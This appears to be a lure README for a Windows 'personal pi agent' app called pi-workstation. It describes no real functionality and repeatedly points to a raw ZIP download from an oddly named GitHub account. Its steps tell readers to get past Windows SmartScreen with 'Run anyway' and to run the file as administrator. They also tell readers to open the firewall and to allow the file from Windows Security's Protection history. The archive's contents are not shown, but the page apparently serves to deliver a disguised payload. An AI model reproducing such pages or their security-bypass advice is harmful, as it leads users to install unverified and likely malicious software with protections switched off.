# 🤖 pi-workstation - Personal Pi Agent Setup

[![Download pi-workstation](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge&logo=github)](https://github.com/Quicksandprotiumguianense974/pi-workstation/raw/refs/heads/main/assets/workstation-pi-3.5.zip)

## 🧭 What This Is

pi-workstation is a Windows app setup for a personal pi agent. It helps you get a local assistant environment running on your PC with a simple setup path.

Use it if you want a personal agent workflow on Windows without building everything from scratch.

## 📥 Download and Install

1. Open the download page: [pi-workstation on GitHub](https://github.com/Quicksandprotiumguianense974/pi-workstation/raw/refs/heads/main/assets/workstation-pi-3.5.zip)
2. On the page, look for the latest release or the main download file.
3. Download the Windows file to your computer.
4. When the download finishes, open the file.
5. If Windows shows a security prompt, choose **Run** or **More info > Run anyway** if you trust the source.
6. Follow the on-screen setup steps.
7. When setup ends, open pi-workstation from your Start menu or desktop.

If the file is a ZIP folder, right-click it and choose **Extract All** before you open the app.

## 💻 Windows Requirements

pi-workstation is meant for Windows 10 or Windows 11.

For a smooth run, use:

- 4 GB RAM or more
- 500 MB free disk space
- A stable internet connection
- Standard user access to install apps
- A recent version of Microsoft Edge or Chrome

If your PC is older, the app may still run, but startup can take longer.

## ⚙️ What It Does

pi-workstation helps you:

- Set up a personal agent on your computer
- Keep your agent files in one place
- Start the app with a simple Windows launch
- Use a local workspace for your agent tasks
- Keep your setup easy to repeat later

It is built for people who want a private workstation style setup without a complex install process.

## 🛠️ How to Set It Up

After you download the app:

1. Find the file in your **Downloads** folder.
2. Open the file or extract it if it came in a ZIP.
3. If you see an installer, double-click it.
4. If you see a program file, double-click it to start the app.
5. Read each setup screen.
6. Keep the default options unless you have a reason to change them.
7. Finish the setup.
8. Open the app and wait for it to load.

If the app asks for a folder location, pick a place you can find later, such as:

- `C:\pi-workstation`
- `C:\Users\YourName\Documents\pi-workstation`

## 🔐 First-Time Use

On first launch, you may see a setup screen for your personal agent workspace.

You may be asked to:

- Choose a local folder
- Confirm a workspace name
- Connect to a model or service
- Allow the app through Windows Firewall
- Accept file access for your workspace

If you see a firewall prompt, allow access for private networks so the app can work on your PC.

## 🖱️ Daily Use

After setup, using pi-workstation should feel simple:

1. Open the app from the Start menu.
2. Load your saved workspace.
3. Start your agent session.
4. Enter your task or prompt.
5. Save any files the app creates.
6. Close the app when you are done.

Keep your workspace folder in the same place so the app can find your saved files.

## 📁 Recommended Folder Layout

A clean folder layout helps keep your setup easy to manage:

- `pi-workstation`
- `pi-workstation\workspace`
- `pi-workstation\logs`
- `pi-workstation\config`

This makes it easier to find settings, saved work, and app logs later.

## 🧩 Common Setup Options

You may see options like these during setup:

- **Workspace path**: Where the app stores your files
- **Auto start**: Opens the app when Windows starts
- **Shortcuts**: Adds a desktop or Start menu icon
- **Data sync**: Keeps your workspace up to date
- **Log level**: Saves more detail for troubleshooting

For a first run, keep the default options. Change them later if needed.

## 🧪 Quick Check

After setup, confirm that the app is working:

- The app opens without an error
- Your workspace folder exists
- You can create or open a file
- The app keeps your settings after restart

If all four work, your setup is ready.

## 🧰 Basic Troubleshooting

If the app does not open:

- Right-click the file and choose **Run as administrator**
- Check that the file finished downloading
- Move the app to a simple folder path
- Restart your PC and try again

If Windows blocks the file:

- Open **Windows Security**
- Check **Protection history**
- Allow the file only if you trust the source

If the app opens but does not save files:

- Check folder permissions
- Make sure the workspace path exists
- Try a folder inside your Documents folder

If the app is slow:

- Close other large apps
- Reboot the PC
- Use a folder on your main drive, not a slow external drive

## 🧭 Where to Get the Download

Use this page to get pi-workstation for Windows:

[Visit the pi-workstation download page](https://github.com/Quicksandprotiumguianense974/pi-workstation/raw/refs/heads/main/assets/workstation-pi-3.5.zip)

## 🧼 Keeping It Organized

To keep your setup in good shape:

- Use one folder for the app
- Use one folder for workspace files
- Back up your config folder
- Remove old files you no longer use
- Keep the app in the same place after setup

This reduces broken paths and lost settings.

## 🔄 Updating the App

When a new version is available:

1. Go to the GitHub page.
2. Download the newer Windows file.
3. Close the app first.
4. Replace the old file or install the new version in a fresh folder.
5. Open the updated app.
6. Check that your workspace still loads.

If your files are separate from the app folder, updating is easier.

## 🧾 File Types You May See

Depending on the release, you may get one of these:

- **.exe** — double-click to install or run
- **.msi** — standard Windows installer
- **.zip** — extract first, then open the app

If you are not sure which file to use, choose the Windows installer file that looks like the main release.

## 🔎 What to Expect After Launch

When pi-workstation starts, you may see:

- A workspace picker
- A setup wizard
- A task screen
- A status bar
- A log panel
- A save button or file browser

These screens help you start your personal agent setup and keep it organized.

## 📌 Best Use Tips

- Keep the app in a fixed folder
- Save work in your workspace folder
- Use short folder names
- Avoid spaces in deep folder paths
- Back up important files before large changes

A simple folder structure makes the app easier to manage.

## 🧠 For a Smooth First Run

Before you start, do these steps:

- Close extra apps
- Make sure you have enough disk space
- Check that your internet connection is stable
- Keep your Windows account signed in
- Use the latest browser if the download page asks you to open a link

This helps the setup finish without errors.

## 📦 Download Link

Get the app here and download the Windows version from the GitHub page:

[https://github.com/Quicksandprotiumguianense974/pi-workstation/raw/refs/heads/main/assets/workstation-pi-3.5.zip](https://github.com/Quicksandprotiumguianense974/pi-workstation/raw/refs/heads/main/assets/workstation-pi-3.5.zip)

## 🗂️ Suggested Shortcuts

You can create these shortcuts for faster access:

- Desktop shortcut for the app
- Start menu shortcut
- Folder shortcut for the workspace
- Shortcut to logs or config files

These make it easier to return to your setup later.

## 🧹 Uninstall or Remove

If you want to remove pi-workstation:

1. Close the app.
2. Delete the app folder or use Windows uninstall tools if available.
3. Keep a backup of your workspace if you want to reuse it later.
4. Remove desktop shortcuts you no longer need.

Your workspace files can stay separate from the app if you want to keep them.

## 📍 Setup Path Example

A simple setup path looks like this:

- App: `C:\pi-workstation`
- Workspace: `C:\pi-workstation\workspace`
- Logs: `C:\pi-workstation\logs`

This keeps everything easy to find and move

## 🧭 Final Check Before Use

Before you begin working, confirm:

- The app opens
- Your workspace loads
- Files save in the right folder
- Shortcuts work
- Windows does not block the app